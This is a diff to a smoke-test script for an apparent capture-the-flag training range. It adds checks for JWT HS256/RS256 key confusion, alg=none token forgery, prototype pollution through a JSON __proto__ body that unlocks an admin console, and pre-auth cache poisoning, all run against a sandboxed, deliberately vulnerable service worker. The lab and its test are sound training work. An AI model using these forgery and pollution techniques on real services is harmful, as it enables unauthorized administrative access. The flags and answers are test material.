@@ -10,10 +10,11 @@
  *   5. Build session claims, sign with HMAC-SHA-256
  *   6. Independently re-verify the session signature
  *   7. Walk every finding in the manifest, hash the canonical token,
- *      check the published 32-bit prefix matches; XOR all twenty into
+ *      check the published 32-bit prefix matches; XOR all 33 into
  *      master_xor and confirm equality
  *   8. Roundtrip the F11/F12/F14/F15/F20 challenge predicates
  *   9. Verify the ECDSA P-256 (F13) signature with Node WebCrypto
+ *  10. Exercise the Tier 4/5 service-worker endpoints and UI contract
  *
  * Exits 0 on success, non-zero with first failure.
  */
@@ -197,6 +198,9 @@ const TOKENS = {
   28: "cyberworld:F28:hpp:token-last-wins",
   29: "cyberworld:F29:race:redeem",
   30: "cyberworld:F30:chain:jwt+xcwops",
+  31: "cyberworld:F31:jwt:hs256-rs256-key-confusion",
+  32: "cyberworld:F32:proto-pollution:admin-console",
+  33: "cyberworld:F33:sw-cache:poisoning:pre-auth-read",
 };
 let acc = 0;
 for (const f of body.findings) {
@@ -209,7 +213,7 @@ for (const f of body.findings) {
 }
 const accHex = (acc >>> 0).toString(16).padStart(8, "0");
 if (accHex !== body.master_xor) fail(`master_xor mismatch: ${accHex} vs ${body.master_xor}`);
-log("findings", `all 20 prefixes match, master_xor closes to 0x${accHex}`);
+log("findings", `all ${body.findings.length} prefixes match, master_xor closes to 0x${accHex}`);
 
 // ───── 8. F11/F12/F14/F15/F20 logic ─────
 // F11: factor n=3233
@@ -223,8 +227,13 @@ function modPow(base, exp, mod) {
   while (e > 0n) { if (e & 1n) r = (r * b) % m; e >>= 1n; b = (b * b) % m; }
   return Number(r);
 }
-const F12_M = modPow(F12_C, body.challenge_artifacts.rsa_toy.d, body.challenge_artifacts.rsa_toy.n);
-if (F12_M !== body.challenge_artifacts.rsa_toy.F12_plaintext) fail("F12 RSA decrypt");
+const rsaToy = body.challenge_artifacts.rsa_toy;
+const phi = (53 - 1) * (61 - 1);
+const privateExponent = Array.from({ length: phi }, (_, i) => i + 1)
+  .find((candidate) => (candidate * rsaToy.e) % phi === 1);
+if (!privateExponent) fail("F12 RSA inverse does not exist");
+const F12_M = modPow(F12_C, privateExponent, rsaToy.n);
+if (F12_M !== 2026) fail("F12 RSA decrypt");
 log("F12", `OK c=${F12_C} -> m=${F12_M}`);
 
 // F13: ECDSA verify with WebCrypto
@@ -242,13 +251,13 @@ log("F13", "OK ECDSA P-256 / SHA-256 verified");
 
 // F14: HMAC-16 collision check against anchor
 const F14 = body.challenge_artifacts.hmac_f14;
-const anchorTag = hmacHex(F14.key, F14.anchor_msg).slice(0, 4);
+const anchorTag = hmacHex(F14.key_published, F14.anchor_msg).slice(0, 4);
 if (anchorTag !== F14.target_tag16) fail("F14 anchor tag mismatch");
 // Quick collision grind (bounded, like the in-browser button)
 let f14Coll = null;
 for (let i = 0; i < 200_000 && !f14Coll; i += 1) {
   const cand = "PHX-" + i.toString(36);
-  if (hmacHex(F14.key, cand).slice(0, 4) === F14.target_tag16 && cand !== F14.anchor_msg) f14Coll = cand;
+  if (hmacHex(F14.key_published, cand).slice(0, 4) === F14.target_tag16 && cand !== F14.anchor_msg) f14Coll = cand;
 }
 if (!f14Coll) console.warn("F14: 200k grind didn't find a collision; analyst may need to try a different schema");
 else log("F14", `OK grinder collided after probing, "${f14Coll}" -> 0x${anchorTag}`);
@@ -272,7 +281,7 @@ log("F15", `OK Vigenere(RIVEST) -> ${F15_PT.slice(0, 24)}...`);
 
 // F20: read intel.html, extract ZWSP/ZWJ stego from .brief section
 const intelHtml = readFileSync(resolve(ROOT, "intel.html"), "utf8");
-const briefMatch = intelHtml.match(/<section class="brief">([\s\S]*?)<\/section>/);
+const briefMatch = intelHtml.match(/<section class="brief"[^>]*>([\s\S]*?)<\/section>/);
 if (!briefMatch) fail("F20 brief section not found");
 const ZWSP = "​", ZWJ = "‍";
 const bits = [];
@@ -291,7 +300,7 @@ const F20_FLAG = Buffer.from(bytes).toString("utf8");
 if (F20_FLAG !== "FLLC2026") fail("F20 stego decode -> " + F20_FLAG);
 log("F20", `OK ZWSP stego -> "${F20_FLAG}" (${bits.length} bits)`);
 
-// ───── 10. Tier-4 (sw-ctf.js) probes via vm sandbox ─────
+// ───── 10. Tier-4/5 (sw-ctf.js) probes via vm sandbox ─────
 import vm from "node:vm";
 const swSource = readFileSync(resolve(ROOT, "sw-ctf.js"), "utf8");
 // minimal Service Worker globals
@@ -416,6 +425,64 @@ const algNoneJwt = (payload) =>
   log("F30", "OK chained alg=none + role=admin + X-Cw-Ops -> master flag");
 }
 
+// F31: public-key bytes must be incorrectly accepted as the HS256 HMAC key.
+{
+  const key = await swCall("GET", "/CyberWorld_login/api/v1/auth/keys.pub");
+  if (key.status !== 200 || !key.body.includes("-----BEGIN PUBLIC KEY-----")) fail("F31: public key endpoint broken");
+  const claims = { sub: "smoke-super", role: "admin", superadmin: true, iat: 0, exp: 9e9 };
+  const denied = await swCall("GET", "/CyberWorld_login/api/v1/internal/super", {
+    Authorization: "Bearer " + algNoneJwt(claims),
+  });
+  if (denied.status === 200) fail("F31: internal/super should reject alg=none");
+  const signingInput = b64u(JSON.stringify({ alg: "HS256", typ: "JWT" })) + "." + b64u(JSON.stringify(claims));
+  const signature = createHmac("sha256", key.body).update(signingInput).digest("base64url");
+  const r = await swCall("GET", "/CyberWorld_login/api/v1/internal/super", {
+    Authorization: "Bearer " + signingInput + "." + signature,
+  });
+  if (r.status !== 200 || !/CTF_FLAG\{F31_/.test(r.body)) fail("F31: HS/RS key confusion did not yield flag (" + r.body + ")");
+  log("F31", "OK HS256 signed with published RSA PEM opens internal/super");
+}
+
+// F32: unlike a JS object literal, parsed JSON retains an own __proto__ key.
+{
+  ctx.self.__ctfResetState();
+  const before = await swCall("GET", "/CyberWorld_login/api/v1/admin/console");
+  if (before.status !== 403) fail("F32: admin console must be locked before pollution");
+  const interceptHtml = readFileSync(resolve(ROOT, "intercept.html"), "utf8");
+  const bodyMatch = interceptHtml.match(/const PROTO_POLLUTION_BODY = '([^']+)';/);
+  if (!bodyMatch) fail("F32: intercept workbench is missing its shared request body");
+  const attackBody = bodyMatch[1];
+  if (!Object.prototype.hasOwnProperty.call(JSON.parse(attackBody), "__proto__"))
+    fail("F32: workbench request body lost its own __proto__ key");
+  const merged = await swCall("POST", "/CyberWorld_login/api/v1/config/merge",
+    { "Content-Type": "application/json" }, attackBody);
+  if (merged.status !== 200) fail("F32: config/merge rejected workbench body (" + merged.body + ")");
+  const after = await swCall("GET", "/CyberWorld_login/api/v1/admin/console");
+  if (after.status !== 200 || !/CTF_FLAG\{F32_/.test(after.body))
+    fail("F32: prototype pollution did not unlock admin console (" + after.body + ")");
+  ctx.self.__ctfResetState();
+  const lockedAgain = await swCall("GET", "/CyberWorld_login/api/v1/admin/console");
+  if (lockedAgain.status !== 403) fail("F32: SW reset left admin console unlocked");
+  if (!interceptHtml.includes('id="tier5"')) fail("Tier 5: lab anchor has no workbench target");
+  if (interceptHtml.includes('localStorage.setItem("cw.role"')) fail("Training badge must not grant an MMO role");
+  log("F32", "OK workbench body preserves __proto__, unlocks console, resets cleanly");
+}
+
+// F33: an unauthenticated cache write is returned before auth is checked.
+{
+  ctx.self.__ctfResetState();
+  const before = await swCall("GET", "/CyberWorld_login/api/v1/admin/cached-users");
+  if (before.status !== 404) fail("F33: cached-users should miss before poisoning");
+  const poison = await swCall("POST", "/CyberWorld_login/api/v1/cache/put?key=admin/users",
+    { "Content-Type": "application/json" }, JSON.stringify({ poisoned: true, by: "smoke-test" }));
+  if (poison.status !== 200) fail("F33: unauthenticated cache write rejected");
+  const after = await swCall("GET", "/CyberWorld_login/api/v1/admin/cached-users");
+  if (after.status !== 200 || !/CTF_FLAG\{F33_/.test(after.body) || !after.json.cached_preview.includes("smoke-test"))
+    fail("F33: cached-users did not return the poisoned value before auth (" + after.body + ")");
+  ctx.self.__ctfResetState();
+  log("F33", "OK unauthenticated cache poison is served before authorization");
+}
+
 // Decoy file marker sanity
 {
   const r = await swCall("GET", "/CyberWorld_login/.env.bak");
@@ -423,4 +490,24 @@ const algNoneJwt = (payload) =>
   log("decoy", "OK .env.bak carries X-CTF-Decoy: true");
 }
 
-console.log("\nSMOKE TEST PASSED -- 30/30 findings closed, SW backend exercised across all 10 Tier-4 exploits");
+// The public training range must not mint an FLLC member role. The workbench
+// defaults to a real analyst workflow; one-click demos are an explicit opt-in.
+{
+  const labHtml = readFileSync(resolve(ROOT, "lab.html"), "utf8");
+  const consoleHtml = readFileSync(resolve(ROOT, "console.html"), "utf8");
+  const interceptHtml = readFileSync(resolve(ROOT, "intercept.html"), "utf8");
+  const entryHtml = readFileSync(resolve(ROOT, "index.html"), "utf8");
+  if (manifest.scope.mmo_grant || !manifest.scope.training_completion) fail("training manifest implies an MMO grant");
+  if ([labHtml, consoleHtml, interceptHtml].some((html) => html.includes('localStorage.setItem("cw.role"')))
+    fail("training UI writes a fake MMO role");
+  if (swSource.includes("cyberworld_grant:")) fail("training service worker implies an MMO grant");
+  if (!interceptHtml.includes('id="mode-toggle"') || !interceptHtml.includes('class="assist-only"'))
+    fail("intercept analyst/guided modes are missing");
+  if (consoleHtml.includes('document.getElementById("enter").addEventListener'))
+    fail("console navigation must not discard the verified training session");
+  if (!entryHtml.includes('href="https://www.fllc.net/CyberWorld/"'))
+    fail("training entry is missing the separate member-game route");
+  log("scope", "OK training badge is separate from FLLC membership; guided assists are opt-in");
+}
+
+console.log("\nSMOKE TEST PASSED -- 33/33 finding commitments verified; Tier 4/5 service-worker challenges exercised");
